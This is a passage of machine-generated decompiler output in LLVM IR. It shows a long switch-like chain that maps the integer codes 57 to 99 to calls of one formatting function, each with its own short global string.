  br label %dec_label_pc_10004858

dec_label_pc_10004858:                            ; preds = %dec_label_pc_10004804, %dec_label_pc_10004810
  %v3_1000485c = icmp eq i32 %v2_10003594, 57
  br i1 %v3_1000485c, label %dec_label_pc_10004864, label %dec_label_pc_100048ac

dec_label_pc_10004864:                            ; preds = %dec_label_pc_10004858
  %v2_10004864 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004878 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004878 = zext i8 %v3_10004878 to i32
  %v4_100048a8 = call i32 @function_10001734(i32 %v2_10004864, i32 ptrtoint ([14 x i8]* @global_var_10017ea8.117 to i32), i32 %v4_10004878)
  br label %dec_label_pc_100048ac

dec_label_pc_100048ac:                            ; preds = %dec_label_pc_10004858, %dec_label_pc_10004864
  %v3_100048b0 = icmp eq i32 %v2_10003594, 58
  br i1 %v3_100048b0, label %dec_label_pc_100048b8, label %dec_label_pc_10004900

dec_label_pc_100048b8:                            ; preds = %dec_label_pc_100048ac
  %v2_100048b8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100048cc = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100048cc = zext i8 %v3_100048cc to i32
  %v4_100048fc = call i32 @function_10001734(i32 %v2_100048b8, i32 ptrtoint ([14 x i8]* @global_var_10017eb8.118 to i32), i32 %v4_100048cc)
  br label %dec_label_pc_10004900

dec_label_pc_10004900:                            ; preds = %dec_label_pc_100048ac, %dec_label_pc_100048b8
  %v3_10004904 = icmp eq i32 %v2_10003594, 59
  br i1 %v3_10004904, label %dec_label_pc_1000490c, label %dec_label_pc_10004954

dec_label_pc_1000490c:                            ; preds = %dec_label_pc_10004900
  %v2_1000490c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004920 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004920 = zext i8 %v3_10004920 to i32
  %v4_10004950 = call i32 @function_10001734(i32 %v2_1000490c, i32 ptrtoint ([14 x i8]* @global_var_10017ec8.119 to i32), i32 %v4_10004920)
  br label %dec_label_pc_10004954

dec_label_pc_10004954:                            ; preds = %dec_label_pc_10004900, %dec_label_pc_1000490c
  %v3_10004958 = icmp eq i32 %v2_10003594, 60
  br i1 %v3_10004958, label %dec_label_pc_10004960, label %dec_label_pc_100049a8

dec_label_pc_10004960:                            ; preds = %dec_label_pc_10004954
  %v2_10004960 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004974 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004974 = zext i8 %v3_10004974 to i32
  %v4_100049a4 = call i32 @function_10001734(i32 %v2_10004960, i32 ptrtoint ([13 x i8]* @global_var_10017ed8.120 to i32), i32 %v4_10004974)
  br label %dec_label_pc_100049a8

dec_label_pc_100049a8:                            ; preds = %dec_label_pc_10004954, %dec_label_pc_10004960
  %v3_100049ac = icmp eq i32 %v2_10003594, 61
  br i1 %v3_100049ac, label %dec_label_pc_100049b4, label %dec_label_pc_100049fc

dec_label_pc_100049b4:                            ; preds = %dec_label_pc_100049a8
  %v2_100049b4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100049c8 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100049c8 = zext i8 %v3_100049c8 to i32
  %v4_100049f8 = call i32 @function_10001734(i32 %v2_100049b4, i32 ptrtoint ([14 x i8]* @global_var_10017ee8.121 to i32), i32 %v4_100049c8)
  br label %dec_label_pc_100049fc

dec_label_pc_100049fc:                            ; preds = %dec_label_pc_100049a8, %dec_label_pc_100049b4
  %v3_10004a00 = icmp eq i32 %v2_10003594, 62
  br i1 %v3_10004a00, label %dec_label_pc_10004a08, label %dec_label_pc_10004a50

dec_label_pc_10004a08:                            ; preds = %dec_label_pc_100049fc
  %v2_10004a08 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004a1c = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004a1c = zext i8 %v3_10004a1c to i32
  %v4_10004a4c = call i32 @function_10001734(i32 %v2_10004a08, i32 ptrtoint ([14 x i8]* @global_var_10017ef8.122 to i32), i32 %v4_10004a1c)
  br label %dec_label_pc_10004a50

dec_label_pc_10004a50:                            ; preds = %dec_label_pc_100049fc, %dec_label_pc_10004a08
  %v3_10004a54 = icmp eq i32 %v2_10003594, 63
  br i1 %v3_10004a54, label %dec_label_pc_10004a5c, label %dec_label_pc_10004aa4

dec_label_pc_10004a5c:                            ; preds = %dec_label_pc_10004a50
  %v2_10004a5c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004a70 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004a70 = zext i8 %v3_10004a70 to i32
  %v4_10004aa0 = call i32 @function_10001734(i32 %v2_10004a5c, i32 ptrtoint ([14 x i8]* @global_var_10017f08.123 to i32), i32 %v4_10004a70)
  br label %dec_label_pc_10004aa4

dec_label_pc_10004aa4:                            ; preds = %dec_label_pc_10004a50, %dec_label_pc_10004a5c
  %v3_10004aa8 = icmp eq i32 %v2_10003594, 64
  br i1 %v3_10004aa8, label %dec_label_pc_10004ab0, label %dec_label_pc_10004af8

dec_label_pc_10004ab0:                            ; preds = %dec_label_pc_10004aa4
  %v2_10004ab0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004ac4 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004ac4 = zext i8 %v3_10004ac4 to i32
  %v4_10004af4 = call i32 @function_10001734(i32 %v2_10004ab0, i32 ptrtoint ([13 x i8]* @global_var_10017f18.124 to i32), i32 %v4_10004ac4)
  br label %dec_label_pc_10004af8

dec_label_pc_10004af8:                            ; preds = %dec_label_pc_10004aa4, %dec_label_pc_10004ab0
  %v3_10004afc = icmp eq i32 %v2_10003594, 65
  br i1 %v3_10004afc, label %dec_label_pc_10004b04, label %dec_label_pc_10004b4c

dec_label_pc_10004b04:                            ; preds = %dec_label_pc_10004af8
  %v2_10004b04 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004b18 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004b18 = zext i8 %v3_10004b18 to i32
  %v4_10004b48 = call i32 @function_10001734(i32 %v2_10004b04, i32 ptrtoint ([13 x i8]* @global_var_10017f28.125 to i32), i32 %v4_10004b18)
  br label %dec_label_pc_10004b4c

dec_label_pc_10004b4c:                            ; preds = %dec_label_pc_10004af8, %dec_label_pc_10004b04
  %v3_10004b50 = icmp eq i32 %v2_10003594, 66
  br i1 %v3_10004b50, label %dec_label_pc_10004b58, label %dec_label_pc_10004ba0

dec_label_pc_10004b58:                            ; preds = %dec_label_pc_10004b4c
  %v2_10004b58 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004b6c = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004b6c = zext i8 %v3_10004b6c to i32
  %v4_10004b9c = call i32 @function_10001734(i32 %v2_10004b58, i32 ptrtoint ([13 x i8]* @global_var_10017f38.126 to i32), i32 %v4_10004b6c)
  br label %dec_label_pc_10004ba0

dec_label_pc_10004ba0:                            ; preds = %dec_label_pc_10004b4c, %dec_label_pc_10004b58
  %v3_10004ba4 = icmp eq i32 %v2_10003594, 67
  br i1 %v3_10004ba4, label %dec_label_pc_10004bac, label %dec_label_pc_10004bf4

dec_label_pc_10004bac:                            ; preds = %dec_label_pc_10004ba0
  %v2_10004bac = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004bc0 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004bc0 = zext i8 %v3_10004bc0 to i32
  %v4_10004bf0 = call i32 @function_10001734(i32 %v2_10004bac, i32 ptrtoint ([12 x i8]* @global_var_10017f48.127 to i32), i32 %v4_10004bc0)
  br label %dec_label_pc_10004bf4

dec_label_pc_10004bf4:                            ; preds = %dec_label_pc_10004ba0, %dec_label_pc_10004bac
  %v3_10004bf8 = icmp eq i32 %v2_10003594, 68
  br i1 %v3_10004bf8, label %dec_label_pc_10004c00, label %dec_label_pc_10004c48

dec_label_pc_10004c00:                            ; preds = %dec_label_pc_10004bf4
  %v2_10004c00 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004c14 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004c14 = zext i8 %v3_10004c14 to i32
  %v4_10004c44 = call i32 @function_10001734(i32 %v2_10004c00, i32 ptrtoint ([13 x i8]* @global_var_10017f54.128 to i32), i32 %v4_10004c14)
  br label %dec_label_pc_10004c48

dec_label_pc_10004c48:                            ; preds = %dec_label_pc_10004bf4, %dec_label_pc_10004c00
  %v3_10004c4c = icmp eq i32 %v2_10003594, 69
  br i1 %v3_10004c4c, label %dec_label_pc_10004c54, label %dec_label_pc_10004c9c

dec_label_pc_10004c54:                            ; preds = %dec_label_pc_10004c48
  %v2_10004c54 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004c68 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004c68 = zext i8 %v3_10004c68 to i32
  %v4_10004c98 = call i32 @function_10001734(i32 %v2_10004c54, i32 ptrtoint ([13 x i8]* @global_var_10017f64.129 to i32), i32 %v4_10004c68)
  br label %dec_label_pc_10004c9c

dec_label_pc_10004c9c:                            ; preds = %dec_label_pc_10004c48, %dec_label_pc_10004c54
  %v3_10004ca0 = icmp eq i32 %v2_10003594, 70
  br i1 %v3_10004ca0, label %dec_label_pc_10004ca8, label %dec_label_pc_10004cf0

dec_label_pc_10004ca8:                            ; preds = %dec_label_pc_10004c9c
  %v2_10004ca8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004cbc = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004cbc = zext i8 %v3_10004cbc to i32
  %v4_10004cec = call i32 @function_10001734(i32 %v2_10004ca8, i32 ptrtoint ([13 x i8]* @global_var_10017f74.130 to i32), i32 %v4_10004cbc)
  br label %dec_label_pc_10004cf0

dec_label_pc_10004cf0:                            ; preds = %dec_label_pc_10004c9c, %dec_label_pc_10004ca8
  %v3_10004cf4 = icmp eq i32 %v2_10003594, 71
  br i1 %v3_10004cf4, label %dec_label_pc_10004cfc, label %dec_label_pc_10004d44

dec_label_pc_10004cfc:                            ; preds = %dec_label_pc_10004cf0
  %v2_10004cfc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004d10 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004d10 = zext i8 %v3_10004d10 to i32
  %v4_10004d40 = call i32 @function_10001734(i32 %v2_10004cfc, i32 ptrtoint ([13 x i8]* @global_var_10017f84.131 to i32), i32 %v4_10004d10)
  br label %dec_label_pc_10004d44

dec_label_pc_10004d44:                            ; preds = %dec_label_pc_10004cf0, %dec_label_pc_10004cfc
  %v3_10004d48 = icmp eq i32 %v2_10003594, 72
  br i1 %v3_10004d48, label %dec_label_pc_10004d50, label %dec_label_pc_10004d98

dec_label_pc_10004d50:                            ; preds = %dec_label_pc_10004d44
  %v2_10004d50 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004d64 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004d64 = zext i8 %v3_10004d64 to i32
  %v4_10004d94 = call i32 @function_10001734(i32 %v2_10004d50, i32 ptrtoint ([13 x i8]* @global_var_10017f94.132 to i32), i32 %v4_10004d64)
  br label %dec_label_pc_10004d98

dec_label_pc_10004d98:                            ; preds = %dec_label_pc_10004d44, %dec_label_pc_10004d50
  %v3_10004d9c = icmp eq i32 %v2_10003594, 73
  br i1 %v3_10004d9c, label %dec_label_pc_10004da4, label %dec_label_pc_10004dec

dec_label_pc_10004da4:                            ; preds = %dec_label_pc_10004d98
  %v2_10004da4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004db8 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004db8 = zext i8 %v3_10004db8 to i32
  %v4_10004de8 = call i32 @function_10001734(i32 %v2_10004da4, i32 ptrtoint ([13 x i8]* @global_var_10017fa4.133 to i32), i32 %v4_10004db8)
  br label %dec_label_pc_10004dec

dec_label_pc_10004dec:                            ; preds = %dec_label_pc_10004d98, %dec_label_pc_10004da4
  %v3_10004df0 = icmp eq i32 %v2_10003594, 74
  br i1 %v3_10004df0, label %dec_label_pc_10004df8, label %dec_label_pc_10004e40

dec_label_pc_10004df8:                            ; preds = %dec_label_pc_10004dec
  %v2_10004df8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004e0c = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004e0c = zext i8 %v3_10004e0c to i32
  %v4_10004e3c = call i32 @function_10001734(i32 %v2_10004df8, i32 ptrtoint ([12 x i8]* @global_var_10017fb4.134 to i32), i32 %v4_10004e0c)
  br label %dec_label_pc_10004e40

dec_label_pc_10004e40:                            ; preds = %dec_label_pc_10004dec, %dec_label_pc_10004df8
  %v3_10004e44 = icmp eq i32 %v2_10003594, 75
  br i1 %v3_10004e44, label %dec_label_pc_10004e4c, label %dec_label_pc_10004e94

dec_label_pc_10004e4c:                            ; preds = %dec_label_pc_10004e40
  %v2_10004e4c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004e60 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004e60 = zext i8 %v3_10004e60 to i32
  %v4_10004e90 = call i32 @function_10001734(i32 %v2_10004e4c, i32 ptrtoint ([14 x i8]* @global_var_10017fc0.135 to i32), i32 %v4_10004e60)
  br label %dec_label_pc_10004e94

dec_label_pc_10004e94:                            ; preds = %dec_label_pc_10004e40, %dec_label_pc_10004e4c
  %v3_10004e98 = icmp eq i32 %v2_10003594, 76
  br i1 %v3_10004e98, label %dec_label_pc_10004ea0, label %dec_label_pc_10004ee8

dec_label_pc_10004ea0:                            ; preds = %dec_label_pc_10004e94
  %v2_10004ea0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004eb4 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004eb4 = zext i8 %v3_10004eb4 to i32
  %v4_10004ee4 = call i32 @function_10001734(i32 %v2_10004ea0, i32 ptrtoint ([11 x i8]* @global_var_10017fd0.136 to i32), i32 %v4_10004eb4)
  br label %dec_label_pc_10004ee8

dec_label_pc_10004ee8:                            ; preds = %dec_label_pc_10004e94, %dec_label_pc_10004ea0
  %v3_10004eec = icmp eq i32 %v2_10003594, 77
  br i1 %v3_10004eec, label %dec_label_pc_10004ef4, label %dec_label_pc_10004f3c

dec_label_pc_10004ef4:                            ; preds = %dec_label_pc_10004ee8
  %v2_10004ef4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004f08 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004f08 = zext i8 %v3_10004f08 to i32
  %v4_10004f38 = call i32 @function_10001734(i32 %v2_10004ef4, i32 ptrtoint ([13 x i8]* @global_var_10017fdc.137 to i32), i32 %v4_10004f08)
  br label %dec_label_pc_10004f3c

dec_label_pc_10004f3c:                            ; preds = %dec_label_pc_10004ee8, %dec_label_pc_10004ef4
  %v3_10004f40 = icmp eq i32 %v2_10003594, 78
  br i1 %v3_10004f40, label %dec_label_pc_10004f48, label %dec_label_pc_10004f90

dec_label_pc_10004f48:                            ; preds = %dec_label_pc_10004f3c
  %v2_10004f48 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004f5c = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004f5c = zext i8 %v3_10004f5c to i32
  %v4_10004f8c = call i32 @function_10001734(i32 %v2_10004f48, i32 ptrtoint ([11 x i8]* @global_var_10017fec.138 to i32), i32 %v4_10004f5c)
  br label %dec_label_pc_10004f90

dec_label_pc_10004f90:                            ; preds = %dec_label_pc_10004f3c, %dec_label_pc_10004f48
  %v3_10004f94 = icmp eq i32 %v2_10003594, 79
  br i1 %v3_10004f94, label %dec_label_pc_10004f9c, label %dec_label_pc_10004fe4

dec_label_pc_10004f9c:                            ; preds = %dec_label_pc_10004f90
  %v2_10004f9c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004fb0 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004fb0 = zext i8 %v3_10004fb0 to i32
  %v4_10004fe0 = call i32 @function_10001734(i32 %v2_10004f9c, i32 ptrtoint ([13 x i8]* @global_var_10017ff8.139 to i32), i32 %v4_10004fb0)
  br label %dec_label_pc_10004fe4

dec_label_pc_10004fe4:                            ; preds = %dec_label_pc_10004f90, %dec_label_pc_10004f9c
  %v3_10004fe8 = icmp eq i32 %v2_10003594, 80
  br i1 %v3_10004fe8, label %dec_label_pc_10004ff0, label %dec_label_pc_10005038

dec_label_pc_10004ff0:                            ; preds = %dec_label_pc_10004fe4
  %v2_10004ff0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005004 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10005004 = zext i8 %v3_10005004 to i32
  %v4_10005034 = call i32 @function_10001734(i32 %v2_10004ff0, i32 ptrtoint ([12 x i8]* @global_var_10018008.140 to i32), i32 %v4_10005004)
  br label %dec_label_pc_10005038

dec_label_pc_10005038:                            ; preds = %dec_label_pc_10004fe4, %dec_label_pc_10004ff0
  %v3_1000503c = icmp eq i32 %v2_10003594, 81
  br i1 %v3_1000503c, label %dec_label_pc_10005044, label %dec_label_pc_1000508c

dec_label_pc_10005044:                            ; preds = %dec_label_pc_10005038
  %v2_10005044 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005058 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10005058 = zext i8 %v3_10005058 to i32
  %v4_10005088 = call i32 @function_10001734(i32 %v2_10005044, i32 ptrtoint ([13 x i8]* @global_var_10018014.141 to i32), i32 %v4_10005058)
  br label %dec_label_pc_1000508c

dec_label_pc_1000508c:                            ; preds = %dec_label_pc_10005038, %dec_label_pc_10005044
  %v3_10005090 = icmp eq i32 %v2_10003594, 82
  br i1 %v3_10005090, label %dec_label_pc_10005098, label %dec_label_pc_100050e0

dec_label_pc_10005098:                            ; preds = %dec_label_pc_1000508c
  %v2_10005098 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100050ac = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100050ac = zext i8 %v3_100050ac to i32
  %v4_100050dc = call i32 @function_10001734(i32 %v2_10005098, i32 ptrtoint ([13 x i8]* @global_var_10018024.142 to i32), i32 %v4_100050ac)
  br label %dec_label_pc_100050e0

dec_label_pc_100050e0:                            ; preds = %dec_label_pc_1000508c, %dec_label_pc_10005098
  %v3_100050e4 = icmp eq i32 %v2_10003594, 83
  br i1 %v3_100050e4, label %dec_label_pc_100050ec, label %dec_label_pc_10005134

dec_label_pc_100050ec:                            ; preds = %dec_label_pc_100050e0
  %v2_100050ec = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005100 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10005100 = zext i8 %v3_10005100 to i32
  %v4_10005130 = call i32 @function_10001734(i32 %v2_100050ec, i32 ptrtoint ([13 x i8]* @global_var_10018034.143 to i32), i32 %v4_10005100)
  br label %dec_label_pc_10005134

dec_label_pc_10005134:                            ; preds = %dec_label_pc_100050e0, %dec_label_pc_100050ec
  %v3_10005138 = icmp eq i32 %v2_10003594, 84
  br i1 %v3_10005138, label %dec_label_pc_10005140, label %dec_label_pc_10005188

dec_label_pc_10005140:                            ; preds = %dec_label_pc_10005134
  %v2_10005140 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005154 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10005154 = zext i8 %v3_10005154 to i32
  %v4_10005184 = call i32 @function_10001734(i32 %v2_10005140, i32 ptrtoint ([14 x i8]* @global_var_10018044.144 to i32), i32 %v4_10005154)
  br label %dec_label_pc_10005188

dec_label_pc_10005188:                            ; preds = %dec_label_pc_10005134, %dec_label_pc_10005140
  %v3_1000518c = icmp eq i32 %v2_10003594, 85
  br i1 %v3_1000518c, label %dec_label_pc_10005194, label %dec_label_pc_100051dc

dec_label_pc_10005194:                            ; preds = %dec_label_pc_10005188
  %v2_10005194 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100051a8 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100051a8 = zext i8 %v3_100051a8 to i32
  %v4_100051d8 = call i32 @function_10001734(i32 %v2_10005194, i32 ptrtoint ([11 x i8]* @global_var_10018054.145 to i32), i32 %v4_100051a8)
  br label %dec_label_pc_100051dc

dec_label_pc_100051dc:                            ; preds = %dec_label_pc_10005188, %dec_label_pc_10005194
  %v3_100051e0 = icmp eq i32 %v2_10003594, 86
  br i1 %v3_100051e0, label %dec_label_pc_100051e8, label %dec_label_pc_10005230

dec_label_pc_100051e8:                            ; preds = %dec_label_pc_100051dc
  %v2_100051e8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100051fc = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100051fc = zext i8 %v3_100051fc to i32
  %v4_1000522c = call i32 @function_10001734(i32 %v2_100051e8, i32 ptrtoint ([13 x i8]* @global_var_10018060.146 to i32), i32 %v4_100051fc)
  br label %dec_label_pc_10005230

dec_label_pc_10005230:                            ; preds = %dec_label_pc_100051dc, %dec_label_pc_100051e8
  %v3_10005234 = icmp eq i32 %v2_10003594, 87
  br i1 %v3_10005234, label %dec_label_pc_1000523c, label %dec_label_pc_10005284

dec_label_pc_1000523c:                            ; preds = %dec_label_pc_10005230
  %v2_1000523c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005250 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10005250 = zext i8 %v3_10005250 to i32
  %v4_10005280 = call i32 @function_10001734(i32 %v2_1000523c, i32 ptrtoint ([13 x i8]* @global_var_10018070.147 to i32), i32 %v4_10005250)
  br label %dec_label_pc_10005284

dec_label_pc_10005284:                            ; preds = %dec_label_pc_10005230, %dec_label_pc_1000523c
  %v3_10005288 = icmp eq i32 %v2_10003594, 88
  br i1 %v3_10005288, label %dec_label_pc_10005290, label %dec_label_pc_100052d8

dec_label_pc_10005290:                            ; preds = %dec_label_pc_10005284
  %v2_10005290 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100052a4 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100052a4 = zext i8 %v3_100052a4 to i32
  %v4_100052d4 = call i32 @function_10001734(i32 %v2_10005290, i32 ptrtoint ([13 x i8]* @global_var_10018080.148 to i32), i32 %v4_100052a4)
  br label %dec_label_pc_100052d8

dec_label_pc_100052d8:                            ; preds = %dec_label_pc_10005284, %dec_label_pc_10005290
  %v3_100052dc = icmp eq i32 %v2_10003594, 89
  br i1 %v3_100052dc, label %dec_label_pc_100052e4, label %dec_label_pc_1000532c

dec_label_pc_100052e4:                            ; preds = %dec_label_pc_100052d8
  %v2_100052e4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100052f8 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100052f8 = zext i8 %v3_100052f8 to i32
  %v4_10005328 = call i32 @function_10001734(i32 %v2_100052e4, i32 ptrtoint ([13 x i8]* @global_var_10018090.149 to i32), i32 %v4_100052f8)
  br label %dec_label_pc_1000532c

dec_label_pc_1000532c:                            ; preds = %dec_label_pc_100052d8, %dec_label_pc_100052e4
  %v3_10005330 = icmp eq i32 %v2_10003594, 90
  br i1 %v3_10005330, label %dec_label_pc_10005338, label %dec_label_pc_10005380

dec_label_pc_10005338:                            ; preds = %dec_label_pc_1000532c
  %v2_10005338 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000534c = load i8, i8* @global_var_1002b913.58, align 1
  %v4_1000534c = zext i8 %v3_1000534c to i32
  %v4_1000537c = call i32 @function_10001734(i32 %v2_10005338, i32 ptrtoint ([11 x i8]* @global_var_100180a0.150 to i32), i32 %v4_1000534c)
  br label %dec_label_pc_10005380

dec_label_pc_10005380:                            ; preds = %dec_label_pc_1000532c, %dec_label_pc_10005338
  %v3_10005384 = icmp eq i32 %v2_10003594, 91
  br i1 %v3_10005384, label %dec_label_pc_1000538c, label %dec_label_pc_100053d4

dec_label_pc_1000538c:                            ; preds = %dec_label_pc_10005380
  %v2_1000538c = ptrtoint i32* %stack_var_-52 to i32
  %v3_100053a0 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100053a0 = zext i8 %v3_100053a0 to i32
  %v4_100053d0 = call i32 @function_10001734(i32 %v2_1000538c, i32 ptrtoint ([12 x i8]* @global_var_100180ac.151 to i32), i32 %v4_100053a0)
  br label %dec_label_pc_100053d4

dec_label_pc_100053d4:                            ; preds = %dec_label_pc_10005380, %dec_label_pc_1000538c
  %v3_100053d8 = icmp eq i32 %v2_10003594, 92
  br i1 %v3_100053d8, label %dec_label_pc_100053e0, label %dec_label_pc_10005428

dec_label_pc_100053e0:                            ; preds = %dec_label_pc_100053d4
  %v2_100053e0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100053f4 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100053f4 = zext i8 %v3_100053f4 to i32
  %v4_10005424 = call i32 @function_10001734(i32 %v2_100053e0, i32 ptrtoint ([13 x i8]* @global_var_100180b8.152 to i32), i32 %v4_100053f4)
  br label %dec_label_pc_10005428

dec_label_pc_10005428:                            ; preds = %dec_label_pc_100053d4, %dec_label_pc_100053e0
  %v3_1000542c = icmp eq i32 %v2_10003594, 93
  br i1 %v3_1000542c, label %dec_label_pc_10005434, label %dec_label_pc_1000547c

dec_label_pc_10005434:                            ; preds = %dec_label_pc_10005428
  %v2_10005434 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005448 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10005448 = zext i8 %v3_10005448 to i32
  %v4_10005478 = call i32 @function_10001734(i32 %v2_10005434, i32 ptrtoint ([12 x i8]* @global_var_100180c8.153 to i32), i32 %v4_10005448)
  br label %dec_label_pc_1000547c

dec_label_pc_1000547c:                            ; preds = %dec_label_pc_10005428, %dec_label_pc_10005434
  %v3_10005480 = icmp eq i32 %v2_10003594, 94
  br i1 %v3_10005480, label %dec_label_pc_10005488, label %dec_label_pc_100054d0

dec_label_pc_10005488:                            ; preds = %dec_label_pc_1000547c
  %v2_10005488 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000549c = load i8, i8* @global_var_1002b913.58, align 1
  %v4_1000549c = zext i8 %v3_1000549c to i32
  %v4_100054cc = call i32 @function_10001734(i32 %v2_10005488, i32 ptrtoint ([13 x i8]* @global_var_100180d4.154 to i32), i32 %v4_1000549c)
  br label %dec_label_pc_100054d0

dec_label_pc_100054d0:                            ; preds = %dec_label_pc_1000547c, %dec_label_pc_10005488
  %v3_100054d4 = icmp eq i32 %v2_10003594, 95
  br i1 %v3_100054d4, label %dec_label_pc_100054dc, label %dec_label_pc_10005524

dec_label_pc_100054dc:                            ; preds = %dec_label_pc_100054d0
  %v2_100054dc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100054f0 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100054f0 = zext i8 %v3_100054f0 to i32
  %v4_10005520 = call i32 @function_10001734(i32 %v2_100054dc, i32 ptrtoint ([12 x i8]* @global_var_100180e4.155 to i32), i32 %v4_100054f0)
  br label %dec_label_pc_10005524

dec_label_pc_10005524:                            ; preds = %dec_label_pc_100054d0, %dec_label_pc_100054dc
  %v3_10005528 = icmp eq i32 %v2_10003594, 96
  br i1 %v3_10005528, label %dec_label_pc_10005530, label %dec_label_pc_10005578

dec_label_pc_10005530:                            ; preds = %dec_label_pc_10005524
  %v2_10005530 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005544 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10005544 = zext i8 %v3_10005544 to i32
  %v4_10005574 = call i32 @function_10001734(i32 %v2_10005530, i32 ptrtoint ([11 x i8]* @global_var_100180f0.156 to i32), i32 %v4_10005544)
  br label %dec_label_pc_10005578

dec_label_pc_10005578:                            ; preds = %dec_label_pc_10005524, %dec_label_pc_10005530
  %v3_1000557c = icmp eq i32 %v2_10003594, 97
  br i1 %v3_1000557c, label %dec_label_pc_10005584, label %dec_label_pc_100055cc

dec_label_pc_10005584:                            ; preds = %dec_label_pc_10005578
  %v2_10005584 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005598 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10005598 = zext i8 %v3_10005598 to i32
  %v4_100055c8 = call i32 @function_10001734(i32 %v2_10005584, i32 ptrtoint ([12 x i8]* @global_var_100180fc.157 to i32), i32 %v4_10005598)
  br label %dec_label_pc_100055cc

dec_label_pc_100055cc:                            ; preds = %dec_label_pc_10005578, %dec_label_pc_10005584
  %v3_100055d0 = icmp eq i32 %v2_10003594, 98
  br i1 %v3_100055d0, label %dec_label_pc_100055d8, label %dec_label_pc_10005620

dec_label_pc_100055d8:                            ; preds = %dec_label_pc_100055cc
  %v2_100055d8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100055ec = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100055ec = zext i8 %v3_100055ec to i32
  %v4_1000561c = call i32 @function_10001734(i32 %v2_100055d8, i32 ptrtoint ([12 x i8]* @global_var_10018108.158 to i32), i32 %v4_100055ec)
  br label %dec_label_pc_10005620

dec_label_pc_10005620:                            ; preds = %dec_label_pc_100055cc, %dec_label_pc_100055d8
  %v3_10005624 = icmp eq i32 %v2_10003594, 99
  br i1 %v3_10005624, label %dec_label_pc_1000562c, label %dec_label_pc_10005674

dec_label_pc_1000562c:                            ; preds = %dec_label_pc_10005620
  %v2_1000562c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005640 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10005640 = zext i8 %v3_10005640 to i32
  %v4_10005670 = call i32 @function_10001734(i32 %v2_1000562c, i32 ptrtoint ([12 x i8]* @global_var_10018114.159 to i32), i32 %v4_10005640)
  br label %dec_label_pc_10005674

dec_label_pc_10005674:                            ; preds = %dec_label_pc_10005620, %dec_label_pc_1000562c
